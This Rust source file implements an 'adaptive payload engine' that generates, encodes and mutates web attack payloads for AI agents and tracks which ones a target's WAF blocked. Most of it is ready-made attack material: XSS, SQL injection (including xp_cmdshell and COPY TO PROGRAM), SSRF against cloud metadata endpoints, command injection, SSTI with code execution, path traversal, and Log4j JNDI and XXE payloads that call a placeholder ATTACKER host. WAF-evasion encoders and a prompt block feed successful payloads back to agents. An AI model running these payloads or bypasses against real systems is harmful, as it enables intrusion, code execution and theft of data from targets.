//! Adaptive Payload Engine — context-aware payload generation and mutation.
//!
//! Static payloads fail against modern targets: WAFs learn signatures, frameworks
//! sanitize known patterns, and every target has a unique parser stack. This
//! engine generates payloads that adapt to:
//!
//! 1. **Target stack** — technology, framework, version detected during recon
//! 2. **WAF behavior** — what got blocked, what encoding bypassed it
//! 3. **Response patterns** — how the target reacts to different inputs
//! 4. **Failed attempts** — payloads that didn't work inform the next mutation
//!
//! The engine maintains a per-engagement payload journal that records what was
//! tried, what worked, and what was blocked — so every subsequent agent benefits
//! from earlier agents' discoveries.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// A payload with its generation context and outcome.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadRecord {
    pub payload: String,
    pub class: String,
    pub target_param: String,
    pub encoding: Encoding,
    pub outcome: Outcome,
    pub waf_response: Option<WafResponse>,
    pub response_code: u16,
    pub response_len: usize,
    pub timestamp: u64,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Outcome {
    /// Payload reached the application and triggered the vulnerability.
    Triggered,
    /// Payload reached the application but did not trigger.
    Reached,
    /// WAF blocked before the application saw it.
    WafBlocked,
    /// Target returned an error unrelated to the payload.
    Error,
    /// Not yet tested.
    Pending,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Encoding {
    None,
    UrlEncode,
    DoubleUrlEncode,
    HtmlEntity,
    UnicodeNormalize,
    Base64,
    HexEncode,
    Utf7,
    ChunkedTransfer,
    NullByte,
    CommentInjection,
    CaseToggle,
    Concatenation,
}

impl Encoding {
    pub fn all() -> &'static [Encoding] {
        &[
            Encoding::None, Encoding::UrlEncode, Encoding::DoubleUrlEncode,
            Encoding::HtmlEntity, Encoding::UnicodeNormalize, Encoding::Base64,
            Encoding::HexEncode, Encoding::NullByte, Encoding::CommentInjection,
            Encoding::CaseToggle, Encoding::Concatenation,
        ]
    }

    pub fn apply(&self, input: &str) -> String {
        match self {
            Encoding::None => input.to_string(),
            Encoding::UrlEncode => url_encode(input),
            Encoding::DoubleUrlEncode => url_encode(&url_encode(input)),
            Encoding::HtmlEntity => html_entity_encode(input),
            Encoding::UnicodeNormalize => unicode_normalize(input),
            Encoding::Base64 => {
                use base64::Engine;
                base64::engine::general_purpose::STANDARD.encode(input)
            }
            Encoding::HexEncode => hex_encode(input),
            Encoding::NullByte => format!("{input}\x00"),
            Encoding::CommentInjection => inject_comments(input),
            Encoding::CaseToggle => toggle_case(input),
            Encoding::Concatenation => concatenate_split(input),
            _ => input.to_string(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WafResponse {
    pub vendor: String,
    pub status: u16,
    pub blocked_pattern: String,
}

/// Technology-aware payload templates per vulnerability class.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadTemplate {
    pub class: String,
    pub base_payloads: Vec<String>,
    pub stack_variants: HashMap<String, Vec<String>>,
}

/// The adaptive engine: accumulates knowledge per engagement and generates
/// context-aware payloads.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct AdaptiveEngine {
    pub journal: Vec<PayloadRecord>,
    pub stack: TargetStack,
    pub waf_profile: WafProfile,
    pub param_profiles: HashMap<String, ParamProfile>,
}

/// What we know about the target's technology.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct TargetStack {
    pub server: String,
    pub framework: String,
    pub language: String,
    pub database: String,
    pub waf: String,
    pub cdn: String,
    pub versions: HashMap<String, String>,
    pub custom_headers: Vec<String>,
}

/// Behavioral profile of a WAF built from observed responses.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct WafProfile {
    pub vendor: String,
    pub blocked_keywords: Vec<String>,
    pub allowed_encodings: Vec<Encoding>,
    pub block_status: u16,
    pub block_body_pattern: String,
    pub rate_limit_threshold: Option<u32>,
    pub challenge_type: Option<String>,
}

/// What we know about a specific parameter from probing it.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ParamProfile {
    pub name: String,
    pub location: ParamLocation,
    pub reflected: bool,
    pub filtered_chars: Vec<char>,
    pub max_length: Option<usize>,
    pub content_type: String,
    pub escape_context: EscapeContext,
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ParamLocation {
    #[default]
    Query,
    Body,
    Header,
    Cookie,
    Path,
    Json,
    Xml,
    Multipart,
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum EscapeContext {
    #[default]
    Unknown,
    HtmlBody,
    HtmlAttribute,
    HtmlAttributeUnquoted,
    JavaScript,
    JsonValue,
    SqlString,
    SqlNumeric,
    UrlPath,
    CssValue,
    XmlCdata,
}

impl AdaptiveEngine {
    pub fn new() -> Self {
        Self::default()
    }

    /// Record a payload attempt and its outcome.
    pub fn record(&mut self, record: PayloadRecord) {
        if record.outcome == Outcome::WafBlocked {
            if let Some(ref waf) = record.waf_response {
                if !self.waf_profile.blocked_keywords.iter().any(|k| record.payload.contains(k)) {
                    self.waf_profile.blocked_keywords.push(extract_trigger(&record.payload));
                }
                self.waf_profile.vendor = waf.vendor.clone();
                self.waf_profile.block_status = waf.status;
            }
        }
        if record.outcome == Outcome::Triggered {
            let enc = record.encoding;
            if !self.waf_profile.allowed_encodings.contains(&enc) {
                self.waf_profile.allowed_encodings.push(enc);
            }
        }
        self.journal.push(record);
    }

    /// Update the target stack from recon data.
    pub fn ingest_recon(&mut self, recon: &serde_json::Value) {
        if let Some(s) = recon.get("tech").and_then(|v| v.as_str()) {
            self.stack.server = s.to_string();
        }
        if let Some(v) = recon.get("versions").and_then(|v| v.as_object()) {
            for (k, val) in v {
                if let Some(s) = val.as_str() {
                    self.stack.versions.insert(k.clone(), s.to_string());
                }
            }
        }
        if let Some(fw) = recon.get("framework").and_then(|v| v.as_str()) {
            self.stack.framework = fw.to_string();
        }
        if let Some(lang) = recon.get("language").and_then(|v| v.as_str()) {
            self.stack.language = lang.to_string();
        }
        if let Some(db) = recon.get("database").and_then(|v| v.as_str()) {
            self.stack.database = db.to_string();
        }
    }

    /// Update a parameter's profile from probing results.
    pub fn profile_param(&mut self, name: &str, profile: ParamProfile) {
        self.param_profiles.insert(name.to_string(), profile);
    }

    /// Generate adapted payloads for a vulnerability class and parameter.
    pub fn generate(&self, class: &str, param: Option<&str>) -> Vec<AdaptivePayload> {
        let base = base_payloads(class);
        let stack_variants = stack_specific_payloads(class, &self.stack);
        let mut results = Vec::new();

        let profile = param.and_then(|p| self.param_profiles.get(p));
        let tried: std::collections::HashSet<String> = self.journal.iter()
            .filter(|r| r.class == class)
            .map(|r| r.payload.clone())
            .collect();

        let successful_encodings = &self.waf_profile.allowed_encodings;
        let blocked_keywords = &self.waf_profile.blocked_keywords;

        for payload in base.iter().chain(stack_variants.iter()) {
            if tried.contains(payload.as_str()) {
                continue;
            }

            let needs_bypass = blocked_keywords.iter().any(|kw| payload.contains(kw));

            if needs_bypass {
                for enc in bypass_encodings(blocked_keywords, successful_encodings) {
                    let mutated = enc.apply(payload);
                    if !tried.contains(&mutated) {
                        results.push(AdaptivePayload {
                            payload: mutated,
                            encoding: enc,
                            rationale: format!("WAF bypass: {enc:?} avoids blocked pattern"),
                            priority: priority_score(class, &enc, profile, true),
                        });
                    }
                }
            } else {
                let adapted = adapt_to_context(payload, profile);
                results.push(AdaptivePayload {
                    payload: adapted,
                    encoding: Encoding::None,
                    rationale: context_rationale(class, profile),
                    priority: priority_score(class, &Encoding::None, profile, false),
                });
            }
        }

        // Mutation-based payloads from successful attempts in the journal
        for rec in self.journal.iter().filter(|r| r.outcome == Outcome::Triggered && r.class == class) {
            for mutation in mutate_payload(&rec.payload, class) {
                if !tried.contains(&mutation) {
                    results.push(AdaptivePayload {
                        payload: mutation,
                        encoding: rec.encoding,
                        rationale: "Mutation of previously successful payload".into(),
                        priority: 90,
                    });
                }
            }
        }

        results.sort_by(|a, b| b.priority.cmp(&a.priority));
        results.truncate(50);
        results
    }

    /// Generate the prompt block that injects adaptive context into agent prompts.
    pub fn prompt_block(&self) -> String {
        if self.journal.is_empty() && self.stack.server.is_empty() {
            return String::new();
        }

        let mut s = String::from("\nADAPTIVE PAYLOAD INTELLIGENCE:\n");

        if !self.stack.server.is_empty() || !self.stack.framework.is_empty() {
            s.push_str(&format!("Target stack: server={} framework={} lang={} db={}\n",
                self.stack.server, self.stack.framework, self.stack.language, self.stack.database));
        }

        if !self.waf_profile.vendor.is_empty() {
            s.push_str(&format!("WAF detected: {} (blocks on status {})\n",
                self.waf_profile.vendor, self.waf_profile.block_status));
            if !self.waf_profile.blocked_keywords.is_empty() {
                let kws: Vec<&str> = self.waf_profile.blocked_keywords.iter()
                    .take(20).map(|s| s.as_str()).collect();
                s.push_str(&format!("Blocked patterns: {}\n", kws.join(", ")));
            }
            if !self.waf_profile.allowed_encodings.is_empty() {
                let encs: Vec<String> = self.waf_profile.allowed_encodings.iter()
                    .map(|e| format!("{e:?}")).collect();
                s.push_str(&format!("Successful bypass encodings: {}\n", encs.join(", ")));
            }
        }

        let triggered: Vec<&PayloadRecord> = self.journal.iter()
            .filter(|r| r.outcome == Outcome::Triggered).collect();
        if !triggered.is_empty() {
            s.push_str(&format!("Successful payloads so far: {} (use these as basis for mutations)\n", triggered.len()));
            for rec in triggered.iter().take(10) {
                s.push_str(&format!("  [{class}] {payload} ({enc:?})\n",
                    class = rec.class,
                    payload = &rec.payload[..rec.payload.len().min(120)],
                    enc = rec.encoding));
            }
        }

        let blocked_count = self.journal.iter().filter(|r| r.outcome == Outcome::WafBlocked).count();
        if blocked_count > 0 {
            s.push_str(&format!("WAF blocks observed: {} — adapt payloads using bypass encodings above\n", blocked_count));
        }

        for (name, prof) in &self.param_profiles {
            if prof.reflected || !prof.filtered_chars.is_empty() {
                s.push_str(&format!("Param '{name}': reflected={} filtered={:?} context={:?}\n",
                    prof.reflected, prof.filtered_chars, prof.escape_context));
            }
        }

        s.push('\n');
        s
    }

    /// Serialize to JSON for persistence between phases.
    pub fn save(&self, path: &std::path::Path) -> std::io::Result<()> {
        let json = serde_json::to_string_pretty(self)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
        std::fs::write(path, json)
    }

    /// Load from a previous phase's persisted state.
    pub fn load(path: &std::path::Path) -> std::io::Result<Self> {
        let json = std::fs::read_to_string(path)?;
        serde_json::from_str(&json)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
    }
}

/// A generated payload with context about why it was chosen.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdaptivePayload {
    pub payload: String,
    pub encoding: Encoding,
    pub rationale: String,
    pub priority: u32,
}

// ── Internal helpers ──

fn base_payloads(class: &str) -> Vec<String> {
    match class.to_uppercase().as_str() {
        s if s.contains("XSS") || s.contains("CWE-79") => vec![
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<details open ontoggle=alert(1)>",
            "\"><img src=x onerror=alert(1)>",
            "'-alert(1)-'",
            "<math><mtext><table><mglyph><svg><mtext><textarea><path d=\"1\" onmouseover=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",
        ].into_iter().map(String::from).collect(),
        s if s.contains("SQL") || s.contains("CWE-89") => vec![
            "' OR '1'='1",
            "1' OR '1'='1'--",
            "1 UNION SELECT NULL,NULL--",
            "' AND SLEEP(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
            "') OR ('1'='1",
            "' OR 1=1#",
            "admin'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' UNION SELECT username,password FROM users--",
        ].into_iter().map(String::from).collect(),
        s if s.contains("SSRF") || s.contains("CWE-918") => vec![
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
            "http://[::ffff:169.254.169.254]/latest/meta-data/",
            "http://0x7f000001/",
            "http://2130706433/",
            "http://017700000001/",
            "http://localhost:6379/",
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:6379/INFO",
        ].into_iter().map(String::from).collect(),
        s if s.contains("CMD") || s.contains("COMMAND") || s.contains("CWE-78") => vec![
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& whoami",
            "\n id",
            "${IFS}id",
            ";{id}",
        ].into_iter().map(String::from).collect(),
        s if s.contains("SSTI") || s.contains("CWE-1336") => vec![
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
        ].into_iter().map(String::from).collect(),
        s if s.contains("TRAVERSAL") || s.contains("LFI") || s.contains("CWE-22") => vec![
            "../../etc/passwd",
            "....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00",
            "....\\\\....\\\\etc\\passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..;/..;/..;/etc/passwd",
            "..%ef%bc%8f..%ef%bc%8fetc/passwd",
        ].into_iter().map(String::from).collect(),
        s if s.contains("XXE") || s.contains("CWE-611") => vec![
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#,
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>"#,
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]>"#,
        ].into_iter().map(String::from).collect(),
        _ => vec![],
    }
}

fn stack_specific_payloads(class: &str, stack: &TargetStack) -> Vec<String> {
    let mut payloads = Vec::new();
    let cls = class.to_uppercase();

    // PHP-specific
    if stack.language.to_lowercase().contains("php") || stack.framework.to_lowercase().contains("laravel") {
        if cls.contains("SQL") {
            payloads.push("' OR 1=1 LIMIT 1-- -".into());
        }
        if cls.contains("SSTI") {
            payloads.push("{{app.request.server.get('DOCUMENT_ROOT')}}".into());
        }
        if cls.contains("TRAVERSAL") || cls.contains("LFI") || cls.contains("CWE-22") {
            payloads.push("php://filter/convert.base64-encode/resource=index.php".into());
            payloads.push("expect://id".into());
        }
    }

    // Node.js / Express
    if stack.language.to_lowercase().contains("node") || stack.framework.to_lowercase().contains("express") {
        if cls.contains("SSTI") {
            payloads.push("#{root.process.mainModule.require('child_process').execSync('id')}".into());
        }
        if cls.contains("SQL") || cls.contains("NOSQL") {
            payloads.push(r#"{"$gt": ""}"#.into());
            payloads.push(r#"{"$ne": null}"#.into());
            payloads.push(r#"{"$regex": ".*"}"#.into());
        }
        if cls.contains("PROTOTYPE") || cls.contains("CWE-1321") {
            payloads.push(r#"{"__proto__": {"isAdmin": true}}"#.into());
            payloads.push(r#"{"constructor": {"prototype": {"isAdmin": true}}}"#.into());
        }
    }

    // Java / Spring
    if stack.language.to_lowercase().contains("java") || stack.framework.to_lowercase().contains("spring") {
        if cls.contains("SSTI") || cls.contains("EL") {
            payloads.push("${T(java.lang.Runtime).getRuntime().exec('id')}".into());
            payloads.push("#{T(java.lang.Runtime).getRuntime().exec('id')}".into());
        }
        if cls.contains("DESERIAL") || cls.contains("CWE-502") {
            payloads.push("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==".into());
        }
        if cls.contains("LOG4") || cls.contains("JNDI") {
            payloads.push("${jndi:ldap://ATTACKER/a}".into());
            payloads.push("${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://ATTACKER/a}".into());
        }
    }

    // Python / Django / Flask
    if stack.language.to_lowercase().contains("python") || stack.framework.to_lowercase().contains("django")
        || stack.framework.to_lowercase().contains("flask") {
        if cls.contains("SSTI") {
            payloads.push("{{config.items()}}".into());
            payloads.push("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".into());
        }
        if cls.contains("DESERIAL") || cls.contains("PICKLE") {
            payloads.push("cos\nsystem\n(S'id'\ntR.".into());
        }
    }

    // .NET / ASP.NET
    if stack.language.to_lowercase().contains(".net") || stack.framework.to_lowercase().contains("asp") {
        if cls.contains("DESERIAL") {
            payloads.push("ysoserial_viewstate_payload".into());
        }
        if cls.contains("TRAVERSAL") || cls.contains("LFI") || cls.contains("CWE-22") {
            payloads.push("..\\..\\..\\web.config".into());
        }
    }

    // Database-specific SQL
    if cls.contains("SQL") {
        match stack.database.to_lowercase().as_str() {
            s if s.contains("mysql") || s.contains("maria") => {
                payloads.push("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--".into());
                payloads.push("' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--".into());
            }
            s if s.contains("postgres") => {
                payloads.push("' AND 1=CAST((SELECT version()) AS int)--".into());
                payloads.push("'; COPY (SELECT '') TO PROGRAM 'id'--".into());
            }
            s if s.contains("mssql") || s.contains("sqlserver") => {
                payloads.push("'; EXEC xp_cmdshell('whoami')--".into());
                payloads.push("' AND 1=CONVERT(int,@@version)--".into());
            }
            s if s.contains("oracle") => {
                payloads.push("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--".into());
            }
            s if s.contains("sqlite") => {
                payloads.push("' UNION SELECT sqlite_version(),NULL--".into());
                payloads.push("' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS int)--".into());
            }
            _ => {}
        }
    }

    payloads
}

fn bypass_encodings(blocked: &[String], successful: &[Encoding]) -> Vec<Encoding> {
    let mut encodings = Vec::new();

    // Prioritize encodings that already worked
    encodings.extend(successful.iter().copied());

    // Then try common WAF bypass encodings
    for enc in &[
        Encoding::DoubleUrlEncode,
        Encoding::UnicodeNormalize,
        Encoding::HtmlEntity,
        Encoding::CaseToggle,
        Encoding::CommentInjection,
        Encoding::NullByte,
        Encoding::Concatenation,
        Encoding::HexEncode,
    ] {
        if !encodings.contains(enc) {
            encodings.push(*enc);
        }
    }
    encodings
}

fn mutate_payload(payload: &str, class: &str) -> Vec<String> {
    let mut mutations = Vec::new();
    let cls = class.to_uppercase();

    // Encoding mutations
    mutations.push(url_encode(payload));
    mutations.push(html_entity_encode(payload));

    // Case mutations
    mutations.push(toggle_case(payload));

    // Whitespace mutations
    mutations.push(payload.replace(' ', "\t"));
    mutations.push(payload.replace(' ', "/**/"));

    if cls.contains("XSS") {
        // Event handler variations
        if payload.contains("onerror") {
            mutations.push(payload.replace("onerror", "onload"));
            mutations.push(payload.replace("onerror", "onfocus"));
            mutations.push(payload.replace("onerror", "onmouseover"));
        }
        // Tag variations
        if payload.contains("<img") {
            mutations.push(payload.replace("<img", "<svg"));
            mutations.push(payload.replace("<img", "<body"));
            mutations.push(payload.replace("<img", "<input"));
        }
    }

    if cls.contains("SQL") {
        // Comment style variations
        if payload.contains("--") {
            mutations.push(payload.replace("--", "#"));
            mutations.push(payload.replace("--", "/*"));
        }
        // Whitespace bypass
        mutations.push(payload.replace(' ', "%09"));
        mutations.push(payload.replace(' ', "%0a"));
    }

    mutations
}

fn adapt_to_context(payload: &str, profile: Option<&ParamProfile>) -> String {
    let Some(prof) = profile else { return payload.to_string() };

    let mut adapted = payload.to_string();

    // Filter out known-blocked characters
    for ch in &prof.filtered_chars {
        adapted = adapted.replace(*ch, &html_entity_encode(&ch.to_string()));
    }

    // Adapt to escape context
    match prof.escape_context {
        EscapeContext::HtmlAttribute => {
            if !adapted.starts_with('"') && !adapted.starts_with('\'') {
                adapted = format!("\" {adapted}");
            }
        }
        EscapeContext::JavaScript => {
            if !adapted.starts_with('\'') && !adapted.starts_with(';') {
                adapted = format!("';{adapted}//");
            }
        }
        EscapeContext::JsonValue => {
            adapted = adapted.replace('\\', "\\\\").replace('"', "\\\"");
        }
        EscapeContext::SqlString => {
            if !adapted.starts_with('\'') {
                adapted = format!("'{adapted}");
            }
        }
        _ => {}
    }

    // Truncate to max length if known
    if let Some(max) = prof.max_length {
        if adapted.len() > max {
            adapted.truncate(max);
        }
    }

    adapted
}

fn priority_score(class: &str, encoding: &Encoding, profile: Option<&ParamProfile>, is_bypass: bool) -> u32 {
    let mut score: u32 = 50;

    // Bypass attempts are higher priority when WAF is detected
    if is_bypass { score += 20; }

    // No-encoding is preferred when no WAF blocks
    if *encoding == Encoding::None { score += 10; }

    // Reflected params are higher priority for XSS
    if let Some(prof) = profile {
        if prof.reflected && class.to_uppercase().contains("XSS") {
            score += 30;
        }
    }

    score.min(100)
}

fn context_rationale(class: &str, profile: Option<&ParamProfile>) -> String {
    let prof = match profile {
        Some(p) => p,
        None => return format!("Standard {class} payload"),
    };

    let mut parts = vec![format!("{class} payload")];
    if prof.reflected { parts.push("reflected param".into()); }
    if !prof.filtered_chars.is_empty() {
        parts.push(format!("avoids filtered chars {:?}", prof.filtered_chars));
    }
    if prof.escape_context != EscapeContext::Unknown {
        parts.push(format!("adapted for {:?} context", prof.escape_context));
    }
    parts.join(", ")
}

fn extract_trigger(payload: &str) -> String {
    // Extract the likely trigger pattern from a blocked payload
    let triggers = ["<script", "onerror", "onload", "alert(", "UNION", "SELECT",
        "SLEEP(", "WAITFOR", "../", "etc/passwd", "<?xml", "<!DOCTYPE"];
    for t in triggers {
        if payload.to_lowercase().contains(&t.to_lowercase()) {
            return t.to_lowercase();
        }
    }
    payload.chars().take(20).collect()
}

fn url_encode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.' || b == b'~' {
            out.push(b as char);
        } else {
            out.push_str(&format!("%{b:02X}"));
        }
    }
    out
}

fn html_entity_encode(s: &str) -> String {
    s.chars().map(|c| format!("&#{};", c as u32)).collect()
}

fn unicode_normalize(s: &str) -> String {
    s.replace('<', "\u{FF1C}")
     .replace('>', "\u{FF1E}")
     .replace('\'', "\u{FF07}")
     .replace('"', "\u{FF02}")
}

fn hex_encode(s: &str) -> String {
    s.bytes().map(|b| format!("\\x{b:02x}")).collect()
}

fn toggle_case(s: &str) -> String {
    s.chars().enumerate().map(|(i, c)| {
        if i % 2 == 0 { c.to_uppercase().next().unwrap_or(c) }
        else { c.to_lowercase().next().unwrap_or(c) }
    }).collect()
}

fn inject_comments(s: &str) -> String {
    let keywords = ["SELECT", "UNION", "FROM", "WHERE", "script", "alert", "onerror"];
    let mut result = s.to_string();
    for kw in keywords {
        if result.contains(kw) {
            let mid = kw.len() / 2;
            let replacement = format!("{}/**/{}",
                &kw[..mid], &kw[mid..]);
            result = result.replacen(kw, &replacement, 1);
        }
    }
    result
}

fn concatenate_split(s: &str) -> String {
    // SQL concatenation split
    if s.to_uppercase().contains("SELECT") || s.contains("'") {
        return s.replace("SELECT", "SEL'+'ECT")
                .replace("UNION", "UNI'+'ON");
    }
    // JS concatenation
    if s.contains("alert") {
        return s.replace("alert", "al\"+\"ert");
    }
    s.to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_xss_payloads() {
        let engine = AdaptiveEngine::new();
        let payloads = engine.generate("XSS", None);
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_waf_bypass_prioritization() {
        let mut engine = AdaptiveEngine::new();
        engine.waf_profile.vendor = "Cloudflare".into();
        engine.waf_profile.blocked_keywords = vec!["<script".into()];
        engine.waf_profile.allowed_encodings = vec![Encoding::DoubleUrlEncode];

        let payloads = engine.generate("XSS", None);
        assert!(payloads.iter().any(|p| p.encoding == Encoding::DoubleUrlEncode));
    }

    #[test]
    fn test_stack_specific_payloads() {
        let mut engine = AdaptiveEngine::new();
        engine.stack.language = "PHP".into();
        let payloads = engine.generate("CWE-22", None);
        assert!(payloads.iter().any(|p| p.payload.contains("php://filter")));
    }

    #[test]
    fn test_encoding_apply() {
        let enc = Encoding::UrlEncode;
        assert_eq!(enc.apply("<script>"), "%3Cscript%3E");
    }

    #[test]
    fn test_record_updates_waf_profile() {
        let mut engine = AdaptiveEngine::new();
        engine.record(PayloadRecord {
            payload: "<script>alert(1)</script>".into(),
            class: "XSS".into(),
            target_param: "q".into(),
            encoding: Encoding::None,
            outcome: Outcome::WafBlocked,
            waf_response: Some(WafResponse { vendor: "Akamai".into(), status: 403, blocked_pattern: "<script".into() }),
            response_code: 403,
            response_len: 0,
            timestamp: 0,
        });
        assert_eq!(engine.waf_profile.vendor, "Akamai");
        assert!(!engine.waf_profile.blocked_keywords.is_empty());
    }
}
